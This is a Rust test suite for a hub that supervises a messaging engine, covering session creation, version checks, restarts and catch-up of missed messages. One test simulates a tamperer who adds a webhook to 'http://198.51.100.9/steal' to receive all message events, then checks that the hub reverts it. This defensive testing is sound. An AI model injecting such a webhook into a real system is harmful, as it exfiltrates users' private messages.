//! The supervision of the engine: the sessions created and corrected, the version checked,
//! a stopped session of a connected number started again, and the catch-up of what arrived
//! while the hub was away.

use arauto_hub::core::number::NumberState;
use arauto_hub::engine;
use arauto_protocol::clock::{Clock, SystemClock};
use arauto_testkit::engine::Fault;
use serde_json::json;

use crate::world::{World, message, phone};

const CHAT: &str = "5511900000001@c.us";

#[tokio::test]
async fn a_session_missing_in_the_engine_is_created_and_one_changed_from_outside_is_corrected() {
    let world = World::new().await;
    // The engine is down when the number is added: the number exists, its session does not.
    world.fake.fail("/api/sessions", Fault::ServerError);
    let number = world.add("vendas", &phone(20)).await;
    let session = number.session.as_str().to_owned();
    assert_eq!(world.fake.status(&session), None);
    world.fake.heal();
    engine::supervise(world.hub()).await;
    assert_eq!(world.fake.status(&session).as_deref(), Some("STOPPED"));
    assert_eq!(world.fake.configured(&session), 1);
    // Nothing changed: nothing is sent again, round after round.
    engine::supervise(world.hub()).await;
    engine::supervise(world.hub()).await;
    assert_eq!(world.fake.configured(&session), 1);
    assert!(
        !world
            .alerts()
            .await
            .contains(&"engine_session_corrected".to_owned())
    );

    // Someone who reached the engine adds a destination for the events.
    let mut tampered = world.fake.config(&session).unwrap();
    tampered["webhooks"]
        .as_array_mut()
        .unwrap()
        .push(json!({"url": "http://198.51.100.9/steal", "events": ["message.any"]}));
    world.fake.tamper_config(&session, tampered);
    engine::supervise(world.hub()).await;
    let config = world.fake.config(&session).unwrap();
    assert_eq!(config["webhooks"].as_array().unwrap().len(), 1);
    assert_eq!(world.fake.configured(&session), 2);
    assert_eq!(
        world
            .alerts()
            .await
            .iter()
            .filter(|kind| *kind == "engine_session_corrected")
            .count(),
        1
    );
    let actions: Vec<(String, String)> = world.audit().await;
    assert!(actions.contains(&("engine.session_corrected".to_owned(), "system".to_owned())));

    // The only destination, pointed elsewhere; then a signing key nobody gave; then the
    // events narrowed: each one is corrected.
    let (hub_url, hub_key) = world.fake.webhook(&session).unwrap();
    for (field, value) in [
        ("url", json!("http://198.51.100.9/v1/engine/x/events")),
        ("hmac", json!({"key": "0".repeat(64)})),
        ("events", json!(["session.status"])),
    ] {
        let mut tampered = world.fake.config(&session).unwrap();
        tampered["webhooks"][0][field] = value;
        world.fake.tamper_config(&session, tampered);
        engine::supervise(world.hub()).await;
        assert_eq!(
            world.fake.webhook(&session).unwrap(),
            (hub_url.clone(), hub_key.clone()),
            "{field} is corrected"
        );
        let config = world.fake.config(&session).unwrap();
        assert_eq!(
            config["webhooks"][0]["events"].as_array().unwrap().len(),
            5,
            "{field}"
        );
    }
}

#[tokio::test]
async fn a_new_secret_of_the_events_reaches_every_session_without_an_alert() {
    let world = World::new().await;
    let number = world.add("vendas", &phone(21)).await;
    let session = number.session.as_str().to_owned();
    let (_, before) = world.fake.webhook(&session).unwrap();
    world
        .fixture
        .admin
        .engine_new_events_secret(&world.vault, world.now())
        .await
        .unwrap();
    engine::supervise(world.hub()).await;
    let (_, after) = world.fake.webhook(&session).unwrap();
    assert_ne!(before, after);
    assert!(
        !world
            .alerts()
            .await
            .contains(&"engine_session_corrected".to_owned())
    );
}

#[tokio::test]
async fn a_version_that_was_not_checked_raises_one_alert() {
    let world = World::new().await;
    engine::supervise(world.hub()).await;
    assert!(world.alerts().await.is_empty());
    world.fake.set_version("2027.1.0", "GOWS");
    engine::supervise(world.hub()).await;
    engine::supervise(world.hub()).await;
    assert_eq!(world.alerts().await, ["engine_version_untested"]);
    let row = world.fixture.admin.engine_show().await.unwrap().unwrap();
    assert_eq!(row.version_seen.as_deref(), Some("2027.1.0+gows"));
    assert_eq!(row.version_tested, Some(false));
}

#[tokio::test]
async fn a_connected_number_whose_session_stopped_is_started_again() {
    let world = World::new().await;
    let number = world.connected("vendas", &phone(22)).await;
    world.fake.set_status(number.session.as_str(), "STOPPED");
    engine::supervise(world.hub()).await;
    assert_eq!(
        world.fake.status(number.session.as_str()).as_deref(),
        Some("WORKING")
    );
    assert_eq!(world.state("vendas").await, NumberState::Connected);
}

#[tokio::test]
async fn the_catch_up_records_what_arrived_while_the_hub_was_away_once() {
    let world = World::new().await;
    let number = world.connected("vendas", &phone(23)).await;
    let session = number.session.as_str();
    let now_s = SystemClock.now_ms() / 1_000;
    world.fake.add_chat(session, CHAT, "Someone");
    // Older than the pairing: history, not something that arrived while away.
    world.fake.add_message(
        session,
        CHAT,
        message(CHAT, "3EB0OLD1", now_s - 3_600, false, "old"),
    );
    // Arrived and the events were lost (the engine gave up resending).
    world.fake.add_message(
        session,
        CHAT,
        message(CHAT, "3EB0NEW1", now_s + 5, false, "first"),
    );
    world.fake.add_message(
        session,
        CHAT,
        message(CHAT, "3EB0NEW2", now_s + 6, true, "second"),
    );
    engine::supervise(world.hub()).await;
    assert_eq!(world.events("message.any").await, 2);
    engine::supervise(world.hub()).await;
    assert_eq!(
        world.events("message.any").await,
        2,
        "a second round adds nothing"
    );
    // The engine finally delivers one of them: still one row.
    let late = world
        .fake
        .envelope(
            session,
            "message.any",
            message(CHAT, "3EB0NEW1", now_s + 5, false, "first"),
            None,
        )
        .unwrap();
    assert_eq!(world.fake.deliver(session, &late).await.unwrap(), 200);
    assert_eq!(world.events("message.any").await, 2);
    let sources: Vec<String> = sqlx::query_scalar(
        "SELECT source FROM engine_event WHERE organization_id = $1 ORDER BY engine_at",
    )
    .bind(world.organization().id())
    .fetch_all(world.hub().pool())
    .await
    .unwrap();
    assert_eq!(sources, ["catch_up", "catch_up"]);
    let open = arauto_hub::repo::engine_event::open(world.hub().pool(), world.organization(), 10)
        .await
        .unwrap();
    assert_eq!(open.len(), 2, "left for the queue of notices");
}

#[tokio::test]
async fn an_engine_that_does_not_answer_changes_nothing() {
    let world = World::new().await;
    world.connected("vendas", &phone(24)).await;
    world.fake.fail("", Fault::ServerError);
    engine::supervise(world.hub()).await;
    assert_eq!(world.state("vendas").await, NumberState::Connected);
    world.fake.heal();
    world.fake.fail("", Fault::Malformed);
    engine::supervise(world.hub()).await;
    assert_eq!(world.state("vendas").await, NumberState::Connected);
}
